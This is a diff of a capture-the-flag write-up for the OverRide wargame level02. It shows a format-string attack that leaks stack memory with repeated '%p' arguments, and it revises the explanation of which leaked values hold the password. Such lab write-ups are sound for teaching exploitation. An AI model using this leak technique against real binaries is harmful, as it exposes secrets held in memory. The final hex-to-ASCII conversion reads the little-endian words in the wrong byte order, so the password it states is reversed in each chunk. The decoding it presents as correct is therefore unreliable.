@@ -15,9 +15,9 @@ level02@OverRide:~$ ./level02 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 AAAA0x7fffffffe0e0 (nil) 0x20 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe2d8 0x61f7ff9a08 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x100702520 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x2520702541414141 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 does not have access!
 level02@OverRide:~$ ./level02 %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
 
-We can see five pointers before ours pointer:
+We can see the pointers preceding the pointer to our buffer, which is situated between two (nil) values. This could indicate the presence of string content. Additionally, we notice that these pointers have a format that is very different from the other pointers. Therefore, we conclude that this must be the content of password.
 
-0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d between 
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
 
 
 Converting these to ASCII gives us: unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M.
